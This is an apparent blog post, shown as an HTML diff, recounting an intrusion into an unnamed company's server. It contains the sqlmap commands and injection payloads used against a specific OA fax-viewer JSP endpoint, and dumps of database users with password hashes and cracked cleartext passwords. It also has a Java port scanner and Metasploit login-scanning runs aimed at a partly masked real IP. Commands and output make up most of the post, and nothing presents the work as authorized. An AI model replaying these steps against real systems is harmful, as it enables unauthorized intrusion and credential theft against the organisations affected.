@@ -1,0 +1,593 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>sqlmap 渗透某集团 - K</title>
+	<meta name="author" content="K">
+
+	
+	<meta name="description" content="0x00 找到盲注点 参考链接http://bluereader.org/article/59585524 python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id &hellip;">
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta name="baidu-site-verification" content="HWyzFajtAX" />
+	<meta name="google-site-verification" content="xf8laC_mNTP9RdWTD-O8D4yYFsMXXnGjvcWVNqfNntk" />
+	<link href="false" rel="alternate" title="K" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	
+	<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?1e6c60ae572d5e740a34233f4accedbd";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+</head>
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">K</a></h1>
+<nav id="K_select">
+	<div class="alignleft menu">
+		<a class="button">Category</a>
+		<div class="container"><ul class="main">
+		
+	
+<li><a href="/blog/categories/markdown">markdown</a></li>
+
+<li><a href="/blog/categories/data">data</a></li>
+
+<li><a href="/blog/categories/php">php</a></li>
+
+<li><a href="/blog/categories/svn">svn</a></li>
+
+<li><a href="/blog/categories/octopress">octopress</a></li>
+
+<li><a href="/blog/categories/mysql">mysql</a></li>
+
+<li><a href="/blog/categories/j2ee">j2ee</a></li>
+
+<li><a href="/blog/categories/mac">mac</a></li>
+
+<li><a href="/blog/categories/struts2">struts2</a></li>
+
+<li><a href="/blog/categories/android">android</a></li>
+
+<li><a href="/blog/categories/hack">hack</a></li>
+
+<li><a href="/blog/categories/design">design</a></li>
+
+<li><a href="/blog/categories/eclipse">eclipse</a></li>
+
+<li><a href="/blog/categories/readme">readme</a></li>
+
+<li><a href="/blog/categories/javascript">javascript</a></li>
+
+<li><a href="/blog/categories/arduino">arduino</a></li>
+
+<li><a href="/blog/categories/jquery">jquery</a></li>
+
+<li><a href="/blog/categories/bootstrap">bootstrap</a></li>
+
+<li><a href="/blog/categories/squild">squild</a></li>
+
+<li><a href="/blog/categories/iphone">iphone</a></li>
+
+<li><a href="/blog/categories/question">question</a></li>
+
+<li><a href="/blog/categories/java">java</a></li>
+
+<li><a href="/blog/categories/photoshop">photoshop</a></li>
+
+<li><a href="/blog/categories/sqlmap">sqlmap</a></li>
+
+<li><a href="/blog/categories/python">python</a></li>
+
+<li><a href="/blog/categories/sql">sql</a></li>
+
+<li><a href="/blog/categories/git">git</a></li>
+
+<li><a href="/blog/categories/pr">pr</a></li>
+
+<li><a href="/blog/categories/linux">linux</a></li>
+
+<li><a href="/blog/categories/oracle">oracle</a></li>
+
+<li><a href="/blog/categories/windows">windows</a></li>
+
+<li><a href="/blog/categories/video">video</a></li>
+
+<li><a href="/blog/categories/travel">travel</a></li>
+
+<li><a href="/blog/categories/web">web</a></li>
+
+<li><a href="/blog/categories/httracl">httracl</a></li>
+
+<li><a href="/blog/categories/httpclient">httpclient</a></li>
+
+<li><a href="/blog/categories/tjrac">tjrac</a></li>
+
+<li><a href="/blog/categories/about_me">about_me</a></li>
+
+<li><a href="/blog/categories/seo">seo</a></li>
+
+<li><a href="/blog/categories/">About me</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:mzkmzk.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+<nav id="main-nav">
+	<ul class="main">
+		<li><a href="/blog/2015/07/16/adoube_me.markdwon/">About me</a></li>
+	
+
+
+</ul>
+
+	</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Category</a>
+		<div class="container"><ul class="main">
+		
+	
+<li><a href="/blog/categories/markdown">markdown</a></li>
+
+<li><a href="/blog/categories/data">data</a></li>
+
+<li><a href="/blog/categories/php">php</a></li>
+
+<li><a href="/blog/categories/svn">svn</a></li>
+
+<li><a href="/blog/categories/octopress">octopress</a></li>
+
+<li><a href="/blog/categories/mysql">mysql</a></li>
+
+<li><a href="/blog/categories/j2ee">j2ee</a></li>
+
+<li><a href="/blog/categories/mac">mac</a></li>
+
+<li><a href="/blog/categories/struts2">struts2</a></li>
+
+<li><a href="/blog/categories/android">android</a></li>
+
+<li><a href="/blog/categories/hack">hack</a></li>
+
+<li><a href="/blog/categories/design">design</a></li>
+
+<li><a href="/blog/categories/eclipse">eclipse</a></li>
+
+<li><a href="/blog/categories/readme">readme</a></li>
+
+<li><a href="/blog/categories/javascript">javascript</a></li>
+
+<li><a href="/blog/categories/arduino">arduino</a></li>
+
+<li><a href="/blog/categories/jquery">jquery</a></li>
+
+<li><a href="/blog/categories/bootstrap">bootstrap</a></li>
+
+<li><a href="/blog/categories/squild">squild</a></li>
+
+<li><a href="/blog/categories/iphone">iphone</a></li>
+
+<li><a href="/blog/categories/question">question</a></li>
+
+<li><a href="/blog/categories/java">java</a></li>
+
+<li><a href="/blog/categories/photoshop">photoshop</a></li>
+
+<li><a href="/blog/categories/sqlmap">sqlmap</a></li>
+
+<li><a href="/blog/categories/python">python</a></li>
+
+<li><a href="/blog/categories/sql">sql</a></li>
+
+<li><a href="/blog/categories/git">git</a></li>
+
+<li><a href="/blog/categories/pr">pr</a></li>
+
+<li><a href="/blog/categories/linux">linux</a></li>
+
+<li><a href="/blog/categories/oracle">oracle</a></li>
+
+<li><a href="/blog/categories/windows">windows</a></li>
+
+<li><a href="/blog/categories/video">video</a></li>
+
+<li><a href="/blog/categories/travel">travel</a></li>
+
+<li><a href="/blog/categories/web">web</a></li>
+
+<li><a href="/blog/categories/httracl">httracl</a></li>
+
+<li><a href="/blog/categories/httpclient">httpclient</a></li>
+
+<li><a href="/blog/categories/tjrac">tjrac</a></li>
+
+<li><a href="/blog/categories/about_me">about_me</a></li>
+
+<li><a href="/blog/categories/seo">seo</a></li>
+
+<li><a href="/blog/categories/">About me</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:mzkmzk.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+<nav id="sub-nav" class="alignright">
+	<div class="social">
+		
+		
+		
+		
+    
+		
+		
+		
+		
+		
+    
+	</div>
+	
+</nav>
+
+</header>
+	
+		
+	
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Sqlmap 渗透某集团</h2>
+	<div class="entry-content"><!--more-->
+
+
+<h3>0x00 找到盲注点</h3>
+
+<p>参考链接<a href="http://bluereader.org/article/59585524">http://bluereader.org/article/59585524</a></p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dbs
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Parameter: fax_id (GET)
+Type: UNION query
+Title: MySQL UNION query (NULL) - 4 columns
+Payload: fax_id=1' UNION ALL SELECT NULL,CONCAT(0x71786a7a71,0x72514471566c4b56546f,0x71706a7871),NULL,NULL#
+
+Type: AND/OR time-based blind
+Title: MySQL &gt; 5.0.11 AND time-based blind (SELECT)
+Payload: fax_id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))dCsX) AND 'uYLq'='uYLq
+---
+
+available databases [3]:                                                       
+[*] information_schema
+[*] mysql
+[*] mysql3235
+</code></pre>
+
+<h3>0x01 查看数据库表和数据</h3>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --tables
+</code></pre>
+
+<p>就会得到数据库中的所有表,然后我随即抽了一个schedule表查看数据</p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dump -T schedule
+</code></pre>
+
+<p>但是结果不如人意</p>
+
+<pre><code>[13:27:41] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+
+Database: mysql3235
+Table: schedule
+[0 entries]
++-------+---------+-----------+
+| TITLE | ENDTIME | STARTTIME |
++-------+---------+-----------+
++-------+---------+-----------+
+</code></pre>
+
+<h3>0x02 尝试爆破数据库密码</h3>
+
+<p>获取数据库用户</p>
+
+<pre><code> python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users
+
+database management system users [5]:                                          
+[*] ''@'localhost'
+[*] 'cubetech'@'localhost'
+[*] 'debugger'@'localhost'
+[*] 'root'@'127.0.0.1'
+[*] 'root'@'localhost'
+</code></pre>
+
+<p>获取数据库密码</p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users --passwords
+
+database management system users password hashes:                              
+[*] cubetech [1]:
+password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
+clear-text password: 123456
+[*] debugger [1]:
+password hash: *6D45DF82DF6169868F43DD422AB3229D376BD1BE
+clear-text password: debugger
+[*] root [1]:
+password hash: *1532B21FE550E115F113DAA9A26D0EEEEF8DEDC7
+</code></pre>
+
+<h3>0x03 探索Mysql端口</h3>
+
+<p>知道了数据库用户名和端口后 我就尝试远程链接数据库了.ip很容易得到. 应该是服务器本身 .这样的服务器管理员应该是不会做服务器和数据库分离的 .</p>
+
+<p>尝试了mysql的3306端口 失败!</p>
+
+<p>写了个java扫描哪些端口开启&hellip;</p>
+
+<pre><code>import java.net.Socket;
+
+import java.util.ArrayList;
+import java.util.List;
+
+
+public class Check_Open_Port {
+public static void main(String args[]) {
+    final List&lt;Integer&gt; li = new ArrayList&lt;Integer&gt;();
+    for (int i = 0; i &lt;= 65535; i++) {
+        li.add(i);
+    }
+
+    for (int i = 0; i &lt;= 100; i++) {
+        new Thread() {
+            public void run() {
+                while (li.size() != 0) {
+                    int li_get = 0;
+                    int num = (int) Math.floor(Math.random()* (li.size()));
+                    try {
+                        li_get = li.get(num);
+                        int num_remove_check =li.indexOf(li_get);
+                        if(num_remove_check!=-1)
+                        li.remove(num_remove_check);
+                        Socket client = new Socket("122.233.243.***",
+                                li_get);
+                        System.out.println("端口 : " + li_get + "已开放");
+                        client.close();
+                    } catch (Exception e) {
+                        System.out.println("端口 : " + li_get + "未开放");
+                    }
+                }
+            }
+        }.start();
+    }
+    //检测ip有无被封锁 和当前集合个数
+    new Thread() {
+        public void run() {
+            while (li.size() != 0) {
+                try {
+                    Socket client = new Socket("122.233.243.***", 80);
+                    System.out.println("端口 : " + 80 + "已开放");
+                    client.close();
+
+                } catch (Exception e) {
+                    System.out.println("端口 : " + 80 + "未开放");
+                }
+                System.out.println("当前集合个数 : "+li.size());
+                try {
+                    join(50000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }.start();
+}
+}
+</code></pre>
+
+<p>扫了好久..结果发现没有扫到 原因有两个</p>
+
+<ol>
+<li><p>其实扫到了 不过控制台信息太多了 把扫到的端口顶掉了 我应该把输出写到一个log里</p></li>
+<li><p>就是并发线程没控制好.一个线程remove list数据的时候,另外一个线程已经remove了.然后数据在List的位置就会改变,导致漏了好多端口.我应该做线程锁,或者写map的 检查过就把value设成true.</p></li>
+</ol>
+
+
+<p>好了扫描端口其实只是一个尝试,并没有太多技术含量.我决定要从Tomcat入手.尝试用metasploit破解Tomcat</p>
+
+<h3>0x04 metasploit 入侵Tomcat</h3>
+
+<p>终端输入</p>
+
+<pre><code>msfconsole
+</code></pre>
+
+<p>设置入侵Tomcat</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/http/tomcat_mgr_login
+msf auxiliary(tomcat_mgr_login) &gt; set RHoSTS 122.233.243.***
+RHoSTS =&gt; 122.233.243.***
+msf auxiliary(tomcat_mgr_login) &gt; set RPORT 80
+RPORT =&gt; 80
+msf auxiliary(tomcat_mgr_login) &gt; run
+</code></pre>
+
+<p>结果并没有破解出密码- -.</p>
+
+<p>参考文章<a href="http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html">http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html</a></p>
+
+<h3>0x05 再次尝试利用 metasploit 检测出 数据库端口</h3>
+
+<pre><code>msf &gt; nmap -Pn -sV 122.233.243.***
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-19 23:05 CST
+
+Nmap scan report for 122.233.243.***
+Host is up (0.13s latency).
+Not shown: 991 filtered ports
+
+PORT      STATE  SERVICE           VERSION
+80/tcp    open   http              Apache Tomcat/Coyote JSP engine 1.1
+135/tcp   closed msrpc
+139/tcp   closed netbios-ssn
+593/tcp   closed http-rpc-epmap
+3389/tcp  open   ms-wbt-server     Microsoft Terminal Service
+4444/tcp  closed krb524
+6059/tcp  open   tcpwrapped
+10000/tcp open   snet-sensor-mgmt?
+10010/tcp open   rxapi?
+Service Info: OS: Windows
+</code></pre>
+
+<p>好像并没有我们想得到的</p>
+
+<h3>0x06 穷途末路的我尝试了下mysql扫描</h3>
+
+<pre><code>msf auxiliary(tomcat_mgr_login) &gt; use auxiliary/scanner/mysql/mysql_login
+msf auxiliary(mysql_login) &gt; set RHOSTS 122.233.243.***
+RHOSTS =&gt; 122.233.243.***
+msf auxiliary(mysql_login) &gt; run
+
+[-] 122.233.243.***:3306 MYSQL - Unable to connect: The connection timed out (122.233.243.***:3306).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+
+<p>其实傻子也知道不可以- -因为看了下<code>info</code>扫的端口是3306 怎么可能可以&hellip;.</p>
+
+<p>参考链接<a href="http://www.bubuko.com/infodetail-343797.html">http://www.bubuko.com/infodetail-343797.html</a></p>
+
+<h3>0x07 利用sql-shell查端口</h3>
+
+<pre><code>show variables like 'port';
+
+or
+
+select * from global_variables where VARIABLE_NAME ='PORT';
+</code></pre>
+
+<p>上面2个命令都可以查询端口,但是global_variables表属于临时表,只在当前连接下显示,所以无法利用 但是还是想通过insert 插入到一个表中</p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --sql-shell  "SELECT  'global_variables'" -v 5 
+
+insert into hr_event(name) select VARIABLE_NAME from information_schema.global_variables where VARIABLE_NAME ='PORT';
+[02:46:34] [WARNING] execution of custom SQL queries is only available when stacked queries are supported
+</code></pre>
+
+<p>通过sqlmap执行的sql-shell只能执行简单的查询,所以此法无效</p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-07-18T11:37:40+08:00" pubdate data-updated="true"></time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/hack/'>hack</a>
+
+
+</div>
+	
+</div>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+		
+		<a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+		
+		
+		<a class="addthis_button_tweet"></a>
+		
+		
+		
+	</div>
+	
+</div>
+
+
+
+
+
+
+  <section>
+    <h1>Comments</h1>
+    <div id="comments" aria-live="polite">
+
+<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="Sqlmap 渗透某集团" data-title="Sqlmap 渗透某集团" data-url="/blog/2015/07/18/sqlmap_zhongxin.markdonw/"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"mzkmzk"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+<!-- 多说公共JS代码 end --></div>
+  </section>
+</div>
+	<footer id="footer" class="inner">
+
+Copyright &copy; 2015
+
+    K
+
+
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
